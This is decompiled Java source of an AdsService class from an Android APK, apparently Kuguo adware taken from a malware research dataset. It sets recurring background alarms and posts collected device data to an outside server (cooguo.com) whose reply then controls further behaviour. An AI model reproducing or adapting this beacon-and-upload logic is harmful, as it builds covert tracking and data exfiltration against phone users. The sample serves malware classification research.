package com.kuguo.pushads;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.util.Log;
import java.io.IOException;
import java.util.Calendar;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ByteArrayEntity;

/* loaded from: /mnt/c/Users/truon/OneDrive/Desktop/MyWorks/Research4IECgroup/Tasks/Graph-Attention-Networks/dataset/preprocessing/apk_tool/AMD_AndroZoo_demo/dex/ce76094374c05efb51a0df6c049b49e4.apk/classes.dex */
public class AdsService extends Service {
    private static int e = 0;
    private e a;
    private k b;
    private m c;
    private Looper d;

    /* JADX INFO: Access modifiers changed from: private */
    public void a(int i) {
        boolean z = false;
        int i2 = 0;
        while (!z && i2 < 8) {
            String externalStorageState = Environment.getExternalStorageState();
            if ("mounted".equals(externalStorageState)) {
                z = b(i);
            } else {
                Log.d("android__log", "externalStorageState = " + externalStorageState);
            }
            i2++;
            try {
                Thread.sleep(2000L);
            } catch (InterruptedException e2) {
                e2.printStackTrace();
            }
        }
        e = a.a(this, "ads/m.txt", 1) + 1;
    }

    public static void a(Context context) {
        if (b(context)) {
            a(context, a.c(context));
        }
    }

    private static void a(Context context, int i) {
        e = i;
        AlarmManager alarmManager = (AlarmManager) context.getSystemService("alarm");
        PendingIntent broadcast = PendingIntent.getBroadcast(context, 0, new Intent(context, (Class<?>) AdsReceiver.class), 134217728);
        alarmManager.cancel(broadcast);
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(System.currentTimeMillis());
        if (i == 0) {
            alarmManager.set(0, calendar.getTimeInMillis() + 30000, broadcast);
        } else {
            alarmManager.setRepeating(0, calendar.getTimeInMillis() + 30000, 7200000L, broadcast);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public boolean b() {
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(System.currentTimeMillis());
        int i = calendar.get(11);
        return i >= 7 || i <= 1;
    }

    private boolean b(int i) {
        HttpPost httpPost = new HttpPost("http://www.cooguo.com/cooguogw/sms.action");
        c(i);
        try {
            httpPost.setEntity(new ByteArrayEntity(this.b.a()));
        } catch (Exception e2) {
        }
        try {
            HttpClient a = h.a(this);
            if (a == null) {
                return false;
            }
            HttpResponse execute = a.execute(httpPost);
            int statusCode = execute.getStatusLine().getStatusCode();
            Log.d("android__log", "-----------status: " + statusCode);
            if (statusCode != 200) {
                httpPost.abort();
                return false;
            }
            a.g(this);
            a.f(this);
            this.a.a(execute.getEntity().getContent());
            return true;
        } catch (ClientProtocolException e3) {
            e3.printStackTrace();
            return false;
        } catch (IOException e4) {
            e4.printStackTrace();
            return false;
        } catch (Exception e5) {
            return false;
        }
    }

    private static boolean b(Context context) {
        String a = a.a(context);
        return (a == null || "".equals(a.trim())) ? false : true;
    }

    private void c(int i) {
        this.b.l = h.d(this);
        this.b.m = i;
        this.b.j = a.h(this);
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public void onCreate() {
        this.b = new k(this);
        this.a = e.a(this);
        this.a.a();
        HandlerThread handlerThread = new HandlerThread("AdsService", 10);
        handlerThread.start();
        this.d = handlerThread.getLooper();
        this.c = new m(this, this.d);
    }

    @Override // android.app.Service
    public void onDestroy() {
        this.d.quit();
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        Message obtainMessage = this.c.obtainMessage();
        obtainMessage.arg1 = i2;
        obtainMessage.obj = intent;
        this.c.sendMessage(obtainMessage);
        return 2;
    }
}
